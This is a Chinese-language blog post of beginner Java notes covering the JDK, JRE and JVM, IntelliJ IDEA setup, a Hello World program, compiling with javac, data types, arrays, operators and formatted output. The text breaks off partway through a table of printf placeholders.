        <content type="html"><![CDATA[<p>之前学习<code>java</code>记得笔记，但是一直没怎么遇到<code>java</code>类的题，平时也不用<code>java</code>，所以经常忘记，今天想起来了再看一遍，再把之前写的笔记整理整理发到博客上。</p><h1 id="Java预学习"><a href="#Java预学习" class="headerlink" title="Java预学习"></a>Java预学习</h1><h2 id="Jave的优势"><a href="#Jave的优势" class="headerlink" title="Jave的优势"></a>Jave的优势</h2><p><strong>从互联网到企业平台，Java是应用最广泛的编程语言，原因在于：</strong></p><ul><li>Java是基于JVM虚拟机的跨平台语言，一次编写，到处运行；</li><li>Java程序易于编写，而且有内置垃圾收集，不必考虑内存管理；</li><li>Java虚拟机拥有工业级的稳定性和高度优化的性能，且经过了长时期的考验；</li><li>Java拥有最广泛的开源社区支持，各种高质量组件随时可用。</li></ul><p>PS：JVM则是执行Java字节码的虚拟机。</p><p><strong>Java语言常年霸占着三大市场：</strong></p><ul><li>互联网和企业应用，这是Java EE的长期优势和市场地位；</li><li>大数据平台，主要有Hadoop、Spark、Flink等，他们都是Java或Scala（一种运行于JVM的编程语言）开发的；</li><li>Android移动平台。</li></ul><p>这意味着Java拥有最广泛的就业市场。</p><h2 id="Java简介"><a href="#Java简介" class="headerlink" title="Java简介"></a>Java简介</h2><ul><li><p>Java最早是由SUN公司（已被Oracle收购）的詹姆斯·高斯林（高司令，人称Java之父）在上个世纪90年代初开发的一种编程语言，最初被命名为Oak，目标是针对小型家电设备的嵌入式应用，结果市场没啥反响。谁料到互联网的崛起，让Oak重新焕发了生机，于是SUN公司改造了Oak，在1995年以Java的名称正式发布，原因是Oak已经被人注册了，因此SUN注册了Java这个商标。随着互联网的高速发展，Java逐渐成为最重要的网络编程语言。</p></li><li><p><strong>Java介于编译型语言和解释型语言之间</strong>、<strong>编译型语言</strong>如C、C++，代码是直接编译成机器码执行，但是由于不同平台(x86、ARM等)CPU的指令集不同，编译的机器码也都不一样。<strong>解释型语言</strong>如Python、Ruby没有这个问题，可以由解释器直接加载源码然后运行，代价就是运行效率太低。而<strong>Java</strong>是将代码编译成一种“字节码”，它类似于抽象的CPU指令，然后，针对不同平台编写虚拟机，不同平台的虚拟机负责加载字节码并执行，这样就实现了<strong>“一次编写，到处运行”</strong>的效果。为了保证不同平台、不同公司开发的虚拟机能够正确执行Java字节码，SUN公司制定了一系列的Java虚拟机规范。</p></li><li><p>随着Java的发展，SUN给Java又分出了三个不同版本:</p><ul><li>Java SE： Standard Edition（标准版）</li><li>Java EE：Enterprise Edition   （企业版）</li><li>Java ME：Micro Edition    （微型版）</li></ul><p>三者区别：</p><p>SE： 包含标准的JVM和标准库</p><p>EE： 在SE的    基础上加上了大量的API和库</p><p>ME：针对嵌入式设备的“瘦身版”，SE的标准库无法再ME上使用，ME的虚拟机也是“瘦身版”</p><p>EE&gt;SE&gt;ME</p></li></ul><h3 id="Jdk"><a href="#Jdk" class="headerlink" title="Jdk"></a>Jdk</h3><p>jdk(Java development kit)：java开发工具包，支持Java程序开发的最小环境，即如果你要进行Java开发，你至少要在你的开发机器上安装JDK。</p><p><strong>JDK = Java程序设计语言+Java虚拟机+Java API类库</strong></p><p>JDK的一些可执行文件：</p><ul><li>java：这个可执行程序其实就是JVM，运行Java程序，就是启动JVM，然后让JVM执行指定的编译后的代码；</li><li>javac：这是Java的编译器，它用于把Java源码文件（以<code>.java</code>后缀结尾）编译为Java字节码文件（以<code>.class</code>后缀结尾）；</li><li>jar：用于把一组<code>.class</code>文件打包成一个<code>.jar</code>文件，便于发布；</li><li>javadoc：用于从Java源码中自动提取注释并生成文档；</li><li>jdb：Java调试器，用于开发阶段的运行调试。</li></ul><h3 id="Jre"><a href="#Jre" class="headerlink" title="Jre"></a>Jre</h3><p>jre(Java Runtime Environment)：java运行环境，支持Java程序运行的标准环境，如果你不需要进行Java程序开发，只是要运行Java程序，例如运行Jar文件，那么你可以在你的运行机器上只安装JRE。</p><p>**JRE = Java虚拟机 +Java API类库中的Java SE API子集 **</p><h3 id="jvm"><a href="#jvm" class="headerlink" title="jvm"></a>jvm</h3><p>jvm(Java Virtual Machine)：java虚拟机 ，其主要任务为将字节码装载到内部，解释/编译为对应平台上的机器指令执行。</p><h3 id="下载IDEA"><a href="#下载IDEA" class="headerlink" title="下载IDEA"></a>下载IDEA</h3><p>IDEA 全称 IntelliJ IDEA，是java语言开发的集成环境（IDE），IntelliJ在业界被公认为最好的java开发工具之一。</p><p>Intellij IDEA 最突出的功能自然是调试（Debug)，可以对Java代码，JavaScript，JQuery，Ajax等技术进行调试。</p><p><a href="https://www.jetbrains.com/idea/download/#section=windows">官方下载地址</a></p><p>根据官方提示即可正确安装。</p><h2 id="第一个Java程序"><a href="#第一个Java程序" class="headerlink" title="第一个Java程序"></a>第一个Java程序</h2><ol><li>打开刚刚下载好的IDEA</li><li>选择一个目录并打开文件夹</li><li>打开左上角File-&gt;Settings-&gt;Plugins,搜索Chinses选择并下载汉化插件，如下图：</li></ol><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655987.png" alt="image-20210803130548237"></p><ol start="4"><li>在左侧项目栏中右键点击项目文件夹-&gt;新建-&gt;新模块，如下图</li></ol><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655988.png" alt="image-20210803130757343"></p><ol start="5"><li>选择Java模块和模块SDK，如果电脑上有JDK则会自动写入，如果没有点击下载JDK</li></ol><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655989.png" alt="image-20210803130944509"></p><ol start="6"><li>点击下一步-&gt;输入项目名-&gt;点击完成</li><li>右键src文件夹-&gt;新建-&gt;Java类</li></ol><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655990.png" alt="image-20210803131146753"></p><ol start="8"><li>这里起名为”Hello”,然后写入以下代码：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="9"><li>点击上方运行-&gt;运行，即可执行代码</li></ol><h3 id="代码解释"><a href="#代码解释" class="headerlink" title="代码解释"></a>代码解释</h3><p>在一个Java程序中，你总能找到一个类似：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>的定义，这个定义被称为class（类），这里的类名是<code>Hello</code>，大小写敏感，<code>class</code>用来定义一个类，<code>public</code>表示这个类是公开的，<code>public</code>、<code>class</code>都是Java的关键字，必须小写，<code>Hello</code>是类的名字，按照习惯，首字母<code>H</code>要大写。而花括号<code>&#123;&#125;</code>中间则是类的定义。</p><p>注意到类的定义中，我们定义了一个名为<code>main</code>的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>方法是可执行的代码块，一个方法除了方法名<code>main</code>，还有用<code>()</code>括起来的方法参数，这里的<code>main</code>方法有一个参数，参数类型是<code>String[]</code>，参数名是<code>args</code>，<code>public</code>、<code>static</code>用来修饰方法，这里表示它是一个公开的静态方法，<code>void</code>是方法的返回类型，而花括号<code>&#123;&#125;</code>中间的就是方法的代码。</p><p>方法的代码每一行用<code>;</code>结束，这里只有一行代码，就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br></pre></td></tr></table></figure><p>它用来打印一个字符串到屏幕上。</p><p>Java规定，某个类定义的<code>public static void main(String[] args)</code>是Java程序的固定入口方法，因此，Java程序总是从<code>main</code>方法开始执行。注意到Java源码的缩进不是必须的，但是用缩进后，格式好看。</p><p>以上这些C语言是一样的！！！</p><h3 id="Java代码的运行过程"><a href="#Java代码的运行过程" class="headerlink" title="Java代码的运行过程"></a>Java代码的运行过程</h3><p>Java源码本质上是一个文本文件，我们需要先用<code>javac</code>把<code>Hello.java</code>编译成字节码文件<code>Hello.class</code>，然后，用<code>java</code>命令执行这个字节码文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────┐</span><br><span class="line">│    Hello.java    │&lt;─── source code</span><br><span class="line">└──────────────────┘</span><br><span class="line">          │ compile</span><br><span class="line">          ▼</span><br><span class="line">┌──────────────────┐</span><br><span class="line">│   Hello.class    │&lt;─── byte code</span><br><span class="line">└──────────────────┘</span><br><span class="line">          │ execute</span><br><span class="line">          ▼</span><br><span class="line">┌──────────────────┐</span><br><span class="line">│    Run on JVM    │</span><br><span class="line">└──────────────────┘</span><br></pre></td></tr></table></figure><p>因此，可执行文件<code>javac</code>是编译器，而可执行文件<code>java</code>就是虚拟机。</p><p>我们使用命令行的方式来感受一下它的执行过程吧</p><ol><li>第一步，在保存<code>Hello.java</code>的目录下执行命令<code>javac Hello.java</code>：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> javac Hello.java</span></span><br></pre></td></tr></table></figure><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655991.png" alt="image-20210803132344946"></p><p>如果源代码无误，上述命令不会有任何输出，而当前目录下会产生一个<code>Hello.class</code>文件：</p><ol start="2"><li>执行<code>Hello.class</code>，使用命令<code>java Hello</code>：</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java Hello</span></span><br></pre></td></tr></table></figure><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655992.png" alt="image-20210803132553101"></p><p>PS：给虚拟机传递的参数<code>Hello</code>是我们定义的类名，虚拟机自动查找对应的class文件并执行。</p><p>如果执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java Hello.class</span></span><br></pre></td></tr></table></figure><p><img src="/post/2022-01/Java%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/202201061655993.png" alt="image-20210803132803575"></p><p>或者还可以直接运行<code>java Hello.java</code>也是可以的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> java Hello.java Hello, world!</span></span><br></pre></td></tr></table></figure><p>这是Java 11新增的一个功能，它可以直接运行一个单文件源码！</p><p>需要注意的是，在实际项目中，单个不依赖第三方库的Java源码是非常罕见的，所以，绝大多数情况下，我们无法直接运行一个Java源码文件，原因是它需要依赖其他的库。</p><h1 id="Java程序基础"><a href="#Java程序基础" class="headerlink" title="Java程序基础"></a>Java程序基础</h1><h2 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h2><p>我们先剖析一个完整的Java程序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        <span class="comment">// 输出文本</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为Java是面向对象的语言，一个程序的基本单位就是<code>class</code>，<code>class</code>是关键字，这里定义的<code>class</code>名字就是<code>Hello</code>：</p><blockquote><p>类名要求：</p><ul><li>类名必须以英文字母开头，后接字母，数字和下划线的组合</li><li>习惯以大写字母开头</li></ul></blockquote><p>注意到<code>public</code>是访问修饰符，表示该<code>class</code>是公开的。</p><p>在<code>class</code>内部，可以定义若干方法（method）：</p><p>这里的方法名是<code>main</code>，返回值是<code>void</code>，表示没有任何返回值。</p><p>我们注意到<code>public</code>除了可以修饰<code>class</code>外，也可以修饰方法。而关键字<code>static</code>是另一个修饰符，它表示静态方法，，目前，我们只需要知道，Java入口程序规定的方法必须是静态方法，方法名必须为<code>main</code>，括号内的参数必须是String数组。</p><blockquote><p> 方法名也有命名规则，命名和<code>class</code>一样，但是首字母小写</p></blockquote><p>在方法内部，语句才是真正的执行代码。Java的每一行语句必须以分号结束：</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>Java有3种注释，第一种是单行注释，以双斜线开头，直到这一行的结尾结束：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是注释...</span></span><br></pre></td></tr></table></figure><p>而多行注释以<code>/*</code>星号开头，以<code>*/</code>结束，可以有多行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是注释</span></span><br><span class="line"><span class="comment">blablabla...</span></span><br><span class="line"><span class="comment">这也是注释</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>还有一种特殊的多行注释，以<code>/**</code>开头，以<code>*/</code>结束，如果有多行，每行通常以星号开头：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 可以用来自动创建文档的注释</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello, world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种特殊的多行注释需要写在类和方法的定义处，可以用于自动创建文档。</p><h2 id="变量和数据类型"><a href="#变量和数据类型" class="headerlink" title="变量和数据类型"></a>变量和数据类型</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>在Java中，变量分为两种：<code>基本类型的变量</code>和<code>引用类型的变量</code>。</p><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><p>基本数据类型是CPU可以直接进行运算的类型。Java定义了以下几种基本数据类型：</p><ul><li>整数类型：byte，short，int，long</li><li>浮点数类型：float，double</li><li>字符类型：char</li><li>布尔类型：boolean</li></ul><h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">2147483647</span>;</span><br><span class="line">        <span class="keyword">int</span> i2 = -<span class="number">2147483648</span>;</span><br><span class="line">        <span class="keyword">int</span> i3 = <span class="number">2_000_000_000</span>; <span class="comment">// 加下划线更容易识别</span></span><br><span class="line">        <span class="keyword">int</span> i4 = <span class="number">0xff0000</span>; <span class="comment">// 十六进制表示的16711680</span></span><br><span class="line">        <span class="keyword">int</span> i5 = <span class="number">0b1000000000</span>; <span class="comment">// 二进制表示的512</span></span><br><span class="line">        <span class="keyword">long</span> l = <span class="number">9000000000000000000L</span>; <span class="comment">// long型的结尾需要加L</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="浮点型"><a href="#浮点型" class="headerlink" title="浮点型"></a>浮点型</h4> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">float</span> f1 = <span class="number">3.14f</span>;</span><br><span class="line"><span class="keyword">float</span> f2 = <span class="number">3.14e38f</span>; <span class="comment">// 科学计数法表示的3.14x10^38</span></span><br><span class="line"><span class="keyword">double</span> d = <span class="number">1.79e308</span>;</span><br><span class="line"><span class="keyword">double</span> d2 = -<span class="number">1.79e308</span>;</span><br><span class="line"><span class="keyword">double</span> d3 = <span class="number">4.9e-324</span>; <span class="comment">// 科学计数法表示的4.9x10^-324</span></span><br></pre></td></tr></table></figure><p>对于<code>float</code>类型，需要加上<code>f</code>后缀。</p><p>浮点数可表示的范围非常大，<code>float</code>类型可最大表示3.4x1038，而<code>double</code>类型可最大表示1.79x10308。</p><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>字符类型<code>char</code>表示一个字符。Java的<code>char</code>类型除了可表示标准的ASCII外，还可以表示一个Unicode字符：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> a = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="keyword">char</span> zh = <span class="string">&#x27;中&#x27;</span>;</span><br></pre></td></tr></table></figure><p>注意<code>char</code>类型使用单引号<code>&#39;</code>，且仅有一个字符，要和双引号<code>&quot;</code>的字符串类型区分开。</p><h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><p>除了上述基本类型的变量，剩下的都是引用类型。例如，引用类型最常用的就是<code>String</code>字符串：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String s = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>引用类型的变量类似于C语言的指针，它内部存储一个“地址”，指向某个对象在内存的位置。</p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>定义变量的时候，如果加上<code>final</code>修饰符，这个变量就变成了常量：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">double</span> PI = <span class="number">3.14</span>; <span class="comment">// PI是一个常量</span></span><br></pre></td></tr></table></figure><p>根据习惯，常量名通常全部大写。</p><h3 id="var关键字"><a href="#var关键字" class="headerlink" title="var关键字"></a>var关键字</h3><p>有些时候，类型的名字太长，写起来比较麻烦。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure><p>这个时候，如果想省略变量类型，可以使用<code>var</code>关键字：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure><p>编译器会根据赋值语句自动推断出变量<code>sb</code>的类型是<code>StringBuilder</code>。对编译器来说，语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sb = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure><p>实际上会自动变成：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure><p>因此，使用<code>var</code>定义变量，仅仅是少写了变量类型而已。</p><h3 id="数组类型"><a href="#数组类型" class="headerlink" title="数组类型"></a>数组类型</h3><p>Java的数组有几个特点：</p><ul><li>数组所有元素初始化为默认值，整型都是<code>0</code>，浮点型是<code>0.0</code>，布尔型是<code>false</code>；</li><li>数组一旦创建后，大小就不可改变。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 5位同学的成绩:</span></span><br><span class="line">        <span class="keyword">int</span>[] ns = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">5</span>];</span><br><span class="line">        ns[<span class="number">0</span>] = <span class="number">68</span>;</span><br><span class="line">        ns[<span class="number">1</span>] = <span class="number">79</span>;</span><br><span class="line">        ns[<span class="number">2</span>] = <span class="number">91</span>;</span><br><span class="line">        ns[<span class="number">3</span>] = <span class="number">85</span>;</span><br><span class="line">        ns[<span class="number">4</span>] = <span class="number">62</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组是<code>引用类型</code>，在使用索引访问数组元素时，如果索引超出范围，运行时将<code>报错</code>。</p><p>可以用<code>数组变量.length</code>获取数组大小。</p><p>也可以在定义数组时直接指定初始化的元素，这样就不必写出数组大小，而是由编译器自动推算数组大小。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 5位同学的成绩:</span></span><br><span class="line">        <span class="keyword">int</span>[] ns = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123; <span class="number">68</span>, <span class="number">79</span>, <span class="number">91</span>, <span class="number">85</span>, <span class="number">62</span> &#125;;</span><br><span class="line">        System.out.println(ns.length); <span class="comment">// 编译器自动推算数组大小为5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还可以进一步简写为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] ns = &#123; <span class="number">68</span>, <span class="number">79</span>, <span class="number">91</span>, <span class="number">85</span>, <span class="number">62</span> &#125;;</span><br></pre></td></tr></table></figure><h2 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h2><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><ul><li>算术运算符</li><li>关系运算符</li><li>位运算符</li><li>逻辑运算符</li><li>赋值运算符</li><li>三元运算符</li><li>instanceof 运算符</li></ul><h3 id="运算规则"><a href="#运算规则" class="headerlink" title="运算规则"></a>运算规则</h3><p>浮点数运算和整数运算相比，只能进行<code>加减乘除</code>这些数值计算，不能做<code>位运算</code>和<code>移位运算</code>。</p><p>如果参与运算的两个数其中一个是<code>整型</code>，那么整型可以自动提升到<code>浮点型</code>。</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>整数运算在除数为<code>0</code>时会报错，而浮点数运算在除数为<code>0</code>时，不会报错，但会返回几个特殊值：</p><ul><li><code>NaN</code>表示Not a Number</li><li><code>Infinity</code>表示无穷大</li><li><code>-Infinity</code>表示负无穷大</li></ul><h3 id="短路运算"><a href="#短路运算" class="headerlink" title="短路运算"></a>短路运算</h3><p>布尔运算的一个重要特点是短路运算。如果一个布尔运算的表达式能提前确定结果，则后续的计算不再执行，直接返回结果。</p><p>因为<code>false &amp;&amp; x</code>的结果总是<code>false</code>，无论<code>x</code>是<code>true</code>还是<code>false</code>，因此，与运算在确定第一个值为<code>false</code>后，不再继续计算，而是直接返回<code>false</code>。</p><h2 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h2><p>Java的编译器对字符串做了特殊照顾，可以使用<code>+</code>连接任意字符串和其他数据类型，这样极大地方便了字符串的处理。如果用<code>+</code>连接字符串和其他数据类型，会将其他数据类型先自动转型为字符串。</p><h2 id="多行字符串"><a href="#多行字符串" class="headerlink" title="多行字符串"></a>多行字符串</h2><p>字符串可以用<code>&quot;&quot;&quot;...&quot;&quot;&quot;</code>表示多行字符串。</p><h1 id="Java流程控制"><a href="#Java流程控制" class="headerlink" title="Java流程控制"></a>Java流程控制</h1><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>在前面的代码中，我们总是使用<code>System.out.println()</code>来向屏幕输出一些内容。</p><p><code>println</code>是print line的缩写，表示输出并换行。因此，如果输出后不想换行，可以用<code>print()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.print(<span class="string">&quot;Hello,&quot;</span>);</span><br><span class="line">        System.out.print(<span class="string">&quot;World!\n&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello,World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">Hello,World!</span><br><span class="line">Hello,World!</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="格式化输出"><a href="#格式化输出" class="headerlink" title="格式化输出"></a>格式化输出</h3><p>果要把数据显示成我们期望的格式，就需要使用格式化输出的功能。格式化输出使用<code>System.out.printf()</code>，通过使用占位符<code>%?</code>，<code>printf()</code>可以把后面的参数格式化成指定格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">double</span> a = <span class="number">3.1415926</span>;</span><br><span class="line">        System.out.printf(<span class="string">&quot;%.2f&quot;</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="number">3.14</span></span><br></pre></td></tr></table></figure><p>Java的格式化功能提供了多种占位符，可以把各种数据类型“格式化”成指定的字符串：</p><table><thead><tr><th align="left">占位符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">%d</td><td align="left">格式化输出整数</td></tr><tr><td align="left">%x</td><td align="left">格式化输出十六进制整数</td></tr><tr><td align="left">%f</td><td 